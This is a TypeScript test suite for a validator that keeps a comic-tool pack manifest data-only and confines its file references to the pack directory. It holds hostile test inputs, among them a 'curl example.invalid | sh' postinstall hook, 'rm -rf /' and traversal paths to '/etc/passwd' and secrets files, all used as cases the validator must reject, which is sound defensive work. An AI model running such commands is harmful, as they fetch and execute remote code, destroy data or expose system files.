// The pack manifest is a strict allowlist, and a genre scaffold is validated by
// the project validators. These tests pin the security-relevant half of that:
// a pack that tries to carry CODE is rejected, and a pack cannot name a file
// outside its own directory or a file that is not JSON data.

import assert from "node:assert/strict";
import { test } from "node:test";
import { asPackManifest, validateGenreScaffold, validatePackManifest } from "../index.js";

function codes(value: unknown): string[] {
  return validatePackManifest(value).issues.map((issue) => issue.code);
}

const VALID = {
  packFormat: 1,
  id: "example-pack",
  name: "Example Pack",
  description: "everything a pack can contribute",
  workflows: [{ name: "high-detail", file: "workflows/high-detail.workflow.json" }],
  genres: [{ id: "noir", title: "Noir", file: "genres/noir.json" }],
  exportPresets: [
    {
      id: "webtoon-tall",
      target: "platform",
      options: { width: 1600, format: "jpeg", quality: 88 },
    },
  ],
  craftBands: [{ id: "noir-band", file: "bands/noir.json" }],
};

test("a complete manifest with every contribution kind is valid", () => {
  const result = validatePackManifest(VALID);
  assert.equal(result.valid, true, JSON.stringify(result.issues));
});

test("a manifest that contributes nothing is valid", () => {
  const result = validatePackManifest({ packFormat: 1, id: "empty", name: "Empty" });
  assert.equal(result.valid, true, JSON.stringify(result.issues));
  const manifest = asPackManifest({ packFormat: 1, id: "empty", name: "Empty" });
  assert.deepEqual(manifest.workflows, []);
  assert.deepEqual(manifest.genres, []);
  assert.deepEqual(manifest.exportPresets, []);
  assert.deepEqual(manifest.craftBands, []);
});

// --- The data-only boundary -------------------------------------------------
// A pack must never be able to run code. The manifest has NO field for a module,
// script, command, or hook, and the allowlist makes an attempt to add one an
// error rather than a field that is quietly ignored. Every shape below is a
// realistic way a plugin format would smuggle executable code in.

test("a code-bearing manifest is rejected", () => {
  for (const carrier of [
    { main: "./evil.js" },
    { module: "./evil.mjs" },
    { require: "evil-package" },
    { exports: { ".": "./evil.js" } },
    { scripts: { postinstall: "curl example.invalid | sh" } },
    { hooks: { beforeExport: "./hook.js" } },
    { plugin: "./plugin.js" },
    { command: "rm -rf /" },
    { eval: "process.exit(1)" },
  ]) {
    const key = Object.keys(carrier)[0] as string;
    const result = validatePackManifest({ ...VALID, ...carrier });
    assert.equal(result.valid, false, `"${key}" must be rejected`);
    const issue = result.issues.find((i) => i.code === "pack.unexpected-field");
    assert.ok(issue, `"${key}" must produce pack.unexpected-field`);
    assert.equal(issue.path, `pack.${key}`);
    assert.match(issue.message, /can never declare code/);
  }
});

test("a code-bearing field is rejected inside every nested entry too", () => {
  const nested = [
    { ...VALID, workflows: [{ name: "w", file: "w.json", exec: "./run.js" }] },
    { ...VALID, genres: [{ id: "g", title: "G", file: "g.json", main: "./g.js" }] },
    {
      ...VALID,
      exportPresets: [{ id: "p", target: "platform", options: {}, postProcess: "./p.js" }],
    },
    {
      ...VALID,
      exportPresets: [{ id: "p", target: "platform", options: { encoder: "./enc.js" } }],
    },
    { ...VALID, craftBands: [{ id: "b", file: "b.json", grader: "./grade.js" }] },
  ];
  for (const manifest of nested) {
    assert.ok(
      codes(manifest).includes("pack.unexpected-field"),
      `nested code field must be rejected: ${JSON.stringify(manifest)}`,
    );
  }
});

test("a file reference cannot escape the pack directory or name a URL", () => {
  for (const file of [
    "/etc/passwd",
    "../../secrets.json",
    "workflows/../../secrets.json",
    "https://example.invalid/graph.json",
    "C:\\Windows\\graph.json",
  ]) {
    const result = validatePackManifest({ ...VALID, workflows: [{ name: "w", file }] });
    assert.equal(result.valid, false, `"${file}" must be rejected`);
    assert.ok(
      result.issues.some((i) => i.code === "pack.file.unsafe"),
      `"${file}"`,
    );
  }
});

test("a file reference must be a .json data file", () => {
  for (const file of ["workflows/graph.js", "workflows/graph.mjs", "workflows/graph.yaml"]) {
    assert.ok(
      codes({ ...VALID, workflows: [{ name: "w", file }] }).includes("pack.file.extension"),
      file,
    );
  }
});

// --- Ordinary shape rules ---------------------------------------------------

test("the manifest format version is pinned", () => {
  assert.ok(codes({ ...VALID, packFormat: 2 }).includes("pack.format-version"));
  assert.ok(codes({ ...VALID, packFormat: undefined }).includes("pack.format-version"));
});

test("the pack id must be a safe single path segment", () => {
  assert.ok(codes({ ...VALID, id: "" }).includes("pack.id"));
  assert.ok(codes({ ...VALID, id: "../escape" }).includes("pack.id.unsafe"));
  assert.ok(codes({ ...VALID, id: "a/b" }).includes("pack.id.unsafe"));
});

test("an export preset must select a built-in engine", () => {
  const bad = { ...VALID, exportPresets: [{ id: "p", target: "gif", options: {} }] };
  const result = validatePackManifest(bad);
  assert.ok(result.issues.some((i) => i.code === "pack.export-preset.target"));
  assert.match(result.issues[0]?.message ?? "", /platform, stitched, plotlink/);
});

test("preset options are held to the same bounds as the CLI flags", () => {
  assert.ok(
    codes({
      ...VALID,
      exportPresets: [{ id: "p", target: "platform", options: { width: 0 } }],
    }).includes("pack.export-preset.width"),
  );
  assert.ok(
    codes({
      ...VALID,
      exportPresets: [{ id: "p", target: "platform", options: { quality: 101 } }],
    }).includes("pack.export-preset.quality"),
  );
  assert.ok(
    codes({
      ...VALID,
      exportPresets: [{ id: "p", target: "platform", options: { format: "gif" } }],
    }).includes("pack.export-preset.format"),
  );
});

test("duplicate ids within one pack are rejected", () => {
  assert.ok(
    codes({
      ...VALID,
      workflows: [
        { name: "w", file: "a.json" },
        { name: "w", file: "b.json" },
      ],
    }).includes("pack.workflow.duplicate"),
  );
  assert.ok(
    codes({
      ...VALID,
      genres: [
        { id: "g", title: "A", file: "a.json" },
        { id: "g", title: "B", file: "b.json" },
      ],
    }).includes("pack.genre.duplicate"),
  );
  assert.ok(
    codes({
      ...VALID,
      exportPresets: [
        { id: "p", target: "platform", options: {} },
        { id: "p", target: "stitched", options: {} },
      ],
    }).includes("pack.export-preset.duplicate"),
  );
  assert.ok(
    codes({
      ...VALID,
      craftBands: [
        { id: "b", file: "a.json" },
        { id: "b", file: "b.json" },
      ],
    }).includes("pack.craft-band.duplicate"),
  );
});

test("a craft band needs an id and a pack-relative JSON file", () => {
  assert.ok(codes({ ...VALID, craftBands: [{ file: "b.json" }] }).includes("pack.craft-band.id"));
  assert.ok(
    codes({ ...VALID, craftBands: [{ id: "b", file: "../out.json" }] }).includes(
      "pack.file.unsafe",
    ),
  );
  assert.ok(
    codes({ ...VALID, craftBands: [{ id: "b", file: "band.js" }] }).includes("pack.file.extension"),
  );
  assert.ok(codes({ ...VALID, craftBands: "bands" }).includes("pack.craft-bands.type"));
  assert.ok(codes({ ...VALID, craftBands: ["bands/noir.json"] }).includes("pack.craft-band.type"));
});

test("a manifest that is not an object is rejected without throwing", () => {
  for (const value of [null, 42, "pack", [], true]) {
    assert.equal(validatePackManifest(value).valid, false);
  }
});

// --- Genre scaffolds --------------------------------------------------------

const SCAFFOLD = {
  episode: {
    schemaVersion: 1,
    id: "ep-001",
    title: "Episode 1",
    sequence: [
      { type: "cut", id: "cut-001" },
      { type: "transition", id: "tr-001" },
      { type: "cut", id: "cut-002" },
    ],
  },
  cuts: [
    { id: "cut-001", image: null, imagePrompt: "a street", negativePrompt: "" },
    { id: "cut-002", image: null, imagePrompt: "a door", negativePrompt: "" },
  ],
  transitions: [
    {
      id: "tr-001",
      type: "gutter",
      gutterHeight: 48,
      text: null,
      sfx: null,
      agentNote: null,
      humanNote: null,
      image: null,
      reviewStatus: "draft",
    },
  ],
  lettering: [],
};

test("a well-formed genre scaffold is valid", () => {
  const result = validateGenreScaffold(SCAFFOLD);
  assert.equal(result.valid, true, JSON.stringify(result.issues));
});

test("a genre scaffold is checked by the project validators, codes and all", () => {
  // A dangling sequence reference is the SAME failure a project would get.
  const dangling = {
    ...SCAFFOLD,
    episode: {
      ...SCAFFOLD.episode,
      sequence: [...SCAFFOLD.episode.sequence, { type: "cut", id: "cut-999" }],
    },
  };
  assert.ok(validateGenreScaffold(dangling).issues.some((i) => i.code === "sequence.missing-cut"));

  // An unsafe episode id would become a directory name on disk.
  const unsafeId = { ...SCAFFOLD, episode: { ...SCAFFOLD.episode, id: "../escape" } };
  assert.ok(validateGenreScaffold(unsafeId).issues.some((i) => i.code === "episode.id.unsafe"));

  // A lettering overlay pointing at a cut that does not exist.
  const orphanOverlay = {
    ...SCAFFOLD,
    lettering: [
      {
        id: "ov-001",
        cutId: "cut-404",
        speaker: "A",
        kind: "speech",
        text: "hi",
        font: "sans-serif",
        fill: "#fff",
        opacity: 1,
        border: null,
        tail: null,
        geometry: { x: 0.1, y: 0.1, width: 0.8, height: 0.1 },
        overflow: false,
        reviewStatus: "draft",
      },
    ],
  };
  assert.ok(
    validateGenreScaffold(orphanOverlay).issues.some((i) => i.code === "overlay.missing-cut"),
  );
});

test("a genre scaffold that is not an object is rejected without throwing", () => {
  assert.equal(validateGenreScaffold("nope").valid, false);
  assert.equal(validateGenreScaffold(null).valid, false);
});
